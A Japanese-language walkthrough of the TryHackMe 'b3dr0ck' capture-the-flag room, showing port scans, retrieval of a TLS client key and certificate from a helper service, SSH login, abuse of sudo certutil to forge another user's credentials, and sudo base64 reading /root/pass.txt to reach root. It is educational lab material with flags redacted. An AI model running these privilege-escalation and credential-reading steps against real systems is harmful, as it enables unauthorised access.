# b3dr0ck CTF

https://tryhackme.com/room/b3dr0ck

```
Barney is setting up the ABC webserver, and trying to use TLS certs to secure connections, but he's having trouble. Here's what we know...
```

- He was able to establish nginx on port 80, redirecting to a custom TLS webserver on port 4040
- There is a TCP socket listening with a simple service to help retrieve TLS credential files (client key & certificate)
- There is another TCP (TLS) helper service listening for authorized connections using files obtained from the above service
- Can you find all the Easter eggs?

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.192.106
root@ip-10-10-214-90:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-25 08:08 GMT
Nmap scan report for 10.10.192.106
Host is up (0.0042s latency).
Not shown: 65530 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
4040/tcp  open  yo-main
9009/tcp  open  pichat
54321/tcp open  unknown
MAC Address: 02:BD:C7:B5:A8:3D (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 6.92 seconds
root@ip-10-10-214-90:~# sudo nmap -sV -p22,80,4040,9009,54321 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-25 08:09 GMT
NSOCK ERROR [158.4360s] mksock_bind_addr(): Bind to 0.0.0.0:53 failed (IOD #6): Address already in use (98)
Nmap scan report for 10.10.192.106
Host is up (0.00026s latency).

PORT      STATE SERVICE      VERSION
22/tcp    open  ssh          OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http         nginx 1.18.0 (Ubuntu)
4040/tcp  open  ssl/yo-main?
9009/tcp  open  pichat?
54321/tcp open  ssl/unknown
```

- 22:SSH
- 80: 4040 に転送
- 9009: TLS 認証を取得するためのサービス
- 54321: 取得した認証を使って接続する、何かのサービス

### gobuster

```shell
gobuster dir -x=txt,php -u https://$TARGET:4040/ -w ./dirlist.txt -t 30 -k
```

何も出ない。

### 80

```http
$ curl -v http://10.10.192.106
*   Trying 10.10.192.106:80...
* Connected to 10.10.192.106 (10.10.192.106) port 80
* using HTTP/1.x
> GET / HTTP/1.1
> Host: 10.10.192.106
> User-Agent: curl/8.11.0
> Accept: */*
>
* Request completely sent off
< HTTP/1.1 301 Moved Permanently
< Server: nginx/1.18.0 (Ubuntu)
< Date: Tue, 25 Mar 2025 08:11:33 GMT
< Content-Type: text/html
< Content-Length: 178
< Connection: keep-alive
< Location: https://10.10.192.106:4040/
<
<html>
<head><title>301 Moved Permanently</title></head>
<body>
<center><h1>301 Moved Permanently</h1></center>
<hr><center>nginx/1.18.0 (Ubuntu)</center>
</body>
</html>
* Connection #0 to host 10.10.192.106 left intact
```

説明文のとおり、4040 ポートに転送される。

### https://10.10.192.106:4040/

```shell
<!DOCTYPE html>
<html>
  <head>
    <title>ABC</title>
    <style>
      body {
        width: 35em;
        margin: 0 auto;
        font-family: Tahoma, Verdana, Arial, sans-serif;
      }
    </style>
  </head>

  <body>
    <h1>Welcome to ABC!</h1>
    <p>Abbadabba Broadcasting Compandy</p>

    <p>We're in the process of building a website! Can you believe this technology exists in bedrock?!?</p>

    <p>Barney is helping to setup the server, and he said this info was important...</p>

<pre>
Hey, it's Barney. I only figured out nginx so far, what the h3ll is a database?!?
Bamm Bamm tried to setup a sql database, but I don't see it running.
Looks like it started something else, but I'm not sure how to turn it off...

He said it was from the toilet and OVER 9000!

Need to try and secure connections with certificates...

</pre>
  </body>
* Connection #0 to host 10.10.192.106 left intact
</html>
```

次は 9000 以上のポートが目標と書かれている。

### 9009

```shell
$ nc 10.10.192.106 9009


 __          __  _                            _                   ____   _____
 \ \        / / | |                          | |            /\   |  _ \ / ____|
  \ \  /\  / /__| | ___ ___  _ __ ___   ___  | |_ ___      /  \  | |_) | |
   \ \/  \/ / _ \ |/ __/ _ \| '_ ` _ \ / _ \ | __/ _ \    / /\ \ |  _ <| |
    \  /\  /  __/ | (_| (_) | | | | | |  __/ | || (_) |  / ____ \| |_) | |____
     \/  \/ \___|_|\___\___/|_| |_| |_|\___|  \__\___/  /_/    \_\____/ \_____|




What are you looking for? help
Looks like the secure login service is running on port: 54321

Try connecting using:
socat stdio ssl:MACHINE_IP:54321,cert=<CERT_FILE>,key=<KEY_FILE>,verify=0
What are you looking for?
```

54321 ポートへの接続方法が書かれていた。

key と打ったら秘密鍵が返ってきた。

```shell
What are you looking for? key
Sounds like you forgot your private key. Let's find it for you...

-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAzGP4Y1wZQJfhI5OUvJrccKdESJIliDkyQJDC5UTJgPhbCp1d
中略
e6YFlQQnQRApGzpZsF+lV9MP/uBzc8mOByu2gZ64W6dOBbNl6A40
-----END RSA PRIVATE KEY-----
```

cert で証明書。

```shell
What are you looking for? cert
Sounds like you forgot your certificate. Let's find it for you...

-----BEGIN CERTIFICATE-----
MIICoTCCAYkCAgTSMA0GCSqGSIb3DQEBCwUAMBQxEjAQBgNVBAMMCWxvY2FsaG9z
中略
+XrxX3c=
-----END CERTIFICATE-----
```

### 54321

取得した鍵と証明書を使って認証成功。

```shell
$ socat stdio ssl:10.10.192.106:54321,cert=./cert,key=./pkey,verify=0
2025/03/25 04:29:20 socat[817183] W refusing to set empty SNI host name


 __     __   _     _             _____        _     _             _____        _
 \ \   / /  | |   | |           |  __ \      | |   | |           |  __ \      | |
  \ \_/ /_ _| |__ | |__   __ _  | |  | | __ _| |__ | |__   __ _  | |  | | ___ | |
   \   / _` | '_ \| '_ \ / _` | | |  | |/ _` | '_ \| '_ \ / _` | | |  | |/ _ \| |
    | | (_| | |_) | |_) | (_| | | |__| | (_| | |_) | |_) | (_| | | |__| | (_) |_|
    |_|\__,_|_.__/|_.__/ \__,_| |_____/ \__,_|_.__/|_.__/ \__,_| |_____/ \___/(_)



Welcome: 'Barney Rubble' is authorized.
b3dr0ck>
```

## 54321

```shell
b3dr0ck> id
Unrecognized command: 'id'

This service is for login and password hints

b3dr0ck> help
Password hint: d1............................ (user = 'Barney Rubble')
```

桁数からみると、MD5 等のハッシュ。  
クラック方法が分からなくて困ったが、まさかそのまま SSH のパスワードだった。

```shell
barney@b3dr0ck:~$ cat barney.txt
THM{f...............................}
```

## 権限昇格１

```
barney@b3dr0ck:~$ sudo -l
[sudo] password for barney:
Matching Defaults entries for barney on b3dr0ck:
    insults, env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User barney may run the following commands on b3dr0ck:
    (ALL : ALL) /usr/bin/certutil
```

certutil を sudo で実行できる。

```shell
barney@b3dr0ck:~$ sudo certutil -h

Cert Tool Usage:
----------------

Show current certs:
  certutil ls

Generate new keypair:
  certutil [username] [fullname]
```

```shell
barney@b3dr0ck:~$ certutil ls

Current Cert List: (/usr/share/abc/certs)
------------------
total 56
drwxrwxr-x 2 root root 4096 Apr 30  2022 .
drwxrwxr-x 8 root root 4096 Apr 29  2022 ..
-rw-r----- 1 root root  972 Mar 25 08:08 barney.certificate.pem
-rw-r----- 1 root root 1674 Mar 25 08:08 barney.clientKey.pem
-rw-r----- 1 root root  894 Mar 25 08:08 barney.csr.pem
-rw-r----- 1 root root 1674 Mar 25 08:08 barney.serviceKey.pem
-rw-r----- 1 root root  976 Mar 25 08:08 fred.certificate.pem
-rw-r----- 1 root root 1674 Mar 25 08:08 fred.clientKey.pem
-rw-r----- 1 root root  898 Mar 25 08:08 fred.csr.pem
-rw-r----- 1 root root 1674 Mar 25 08:08 fred.serviceKey.pem
```

fred の既存のキーを読む方法はなさそうに思えるので、生成する。

フルネームが分からないので適当に「fred jr」にした。

```shell
barney@b3dr0ck:~$ sudo certutil fred 'fred jr'
Generating credentials for user: fred (fred jr)
Generated: clientKey for fred: /usr/share/abc/certs/fred.clientKey.pem
Generated: certificate for fred: /usr/share/abc/certs/fred.certificate.pem
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAxJehAfD8KHhuDNLAT1TiLbR/HsNUhGhYqmae+DCVah0D3GRq
中略
3VzR3aQzTeY5ZDTcRXJv4DB6lKeypFs/3L7Dz+wzClUsL5FNwkA=
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIICmzCCAYMCAjA5MA0GCSqGSIb3DQEBCwUAMBQxEjAQBgNVBAMMCWxvY2FsaG9z
中略
M8A4EHS+oSM6Pv8krhDrEUFz+GvKcLNT6/yWDsiym9fWExEccg0Jip3FgBcB/Qo=
-----END CERTIFICATE-----
```

再び、54321 ポートに接続。

```shell
$ socat stdio ssl:10.10.192.106:54321,cert=./fred_cert,key=./fred_key,verify=0
2025/03/25 05:40:31 socat[11987] W refusing to set empty SNI host name


 __     __   _     _             _____        _     _             _____        _
 \ \   / /  | |   | |           |  __ \      | |   | |           |  __ \      | |
  \ \_/ /_ _| |__ | |__   __ _  | |  | | __ _| |__ | |__   __ _  | |  | | ___ | |
   \   / _` | '_ \| '_ \ / _` | | |  | |/ _` | '_ \| '_ \ / _` | | |  | |/ _ \| |
    | | (_| | |_) | |_) | (_| | | |__| | (_| | |_) | |_) | (_| | | |__| | (_) |_|
    |_|\__,_|_.__/|_.__/ \__,_| |_____/ \__,_|_.__/|_.__/ \__,_| |_____/ \___/(_)



Welcome: 'fred jr' is authorized.
b3dr0ck> password
Password hint: ひみつ (user = 'fred jr')
```

fred としてログインできた。フルネームは何でも良かったらしい。

```shell
fred@b3dr0ck:~$ cat ./fred.txt
THM{08..........................}
```

## 権限昇格２

```shell
fred@b3dr0ck:~$ sudo -l
Matching Defaults entries for fred on b3dr0ck:
    insults, env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User fred may run the following commands on b3dr0ck:
    (ALL : ALL) NOPASSWD: /usr/bin/base32 /root/pass.txt
    (ALL : ALL) NOPASSWD: /usr/bin/base64 /root/pass.txt
```

sudo で、/root/pass.txt は読める。

```shell
fred@b3dr0ck:~$ sudo /usr/bin/base64 /root/pass.txt
...................................==
```

これを base64, base32, base64 デコードしたら MD5 ハッシュのようなものになった。

```shell
$ echo ...................................== | base64 -d | base32 -d | base64 -d
ひみつ
```

これは MD5 としてクラックできた。そのパスワードを使い、su で root になれた。

```shell
fred@b3dr0ck:~$ su -
Password:
root@b3dr0ck:~# id
uid=0(root) gid=0(root) groups=0(root)
```

```shell
root@b3dr0ck:~# cat ./root.txt
THM{de.............................}
```

ゲッツ！

## 振り返り

- 一番時間がかかったのは、MD5 ハッシュ風の文字列をそのままパスワードとして使うところ。その発想は無かった。
